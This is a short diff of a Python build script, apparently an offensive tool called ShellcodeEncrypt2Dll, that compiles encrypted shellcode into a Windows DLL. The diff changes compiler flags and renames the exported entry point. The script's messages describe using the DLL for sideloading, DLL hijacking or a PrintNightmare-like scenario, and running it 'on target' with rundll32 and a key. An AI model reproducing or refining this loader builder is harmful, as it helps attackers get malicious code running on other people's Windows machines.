@@ -103,14 +103,14 @@ python ShellcodeEncrypt2Dll.py --standalone shellcode.raw
 
     if args.standalone:
         print("STANDALONE mode")
-        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O2', '-fvisibility=hidden', '-DSTANDALONE', '-Wl,--dynamicbase', '-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'shell.dll']
+        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O0', '-fvisibility=hidden', '-DSTANDALONE', '-fpermissive', '-Wl,--dynamicbase', '-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'shell.dll']
         print("You can use it for sideload/hijack or in a printnightmare-like scenario.")
-        print("Or just simply: rundll32 <path_to_dll>,EntryPoint")
+        print("Or just simply: rundll32 <path_to_dll>,EPoint")
 
     elif args.non_standalone:
         print("NON-STANDALONE mode:")
-        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O2', '-fvisibility=hidden', '-Wl,--dynamicbase', '-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'shell.dll']        
-        print(f"Try to run on target: rundll32 <path_to_dll>,EntryPoint {KEY.decode()}")
+        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O0', '-fvisibility=hidden', '-Wl,--dynamicbase', '-fpermissive','-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'shell.dll']        
+        print(f"Try to run on target: rundll32 <path_to_dll>,EPoint {KEY.decode()}")
     try:
         print("[+] Compiling")
         result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
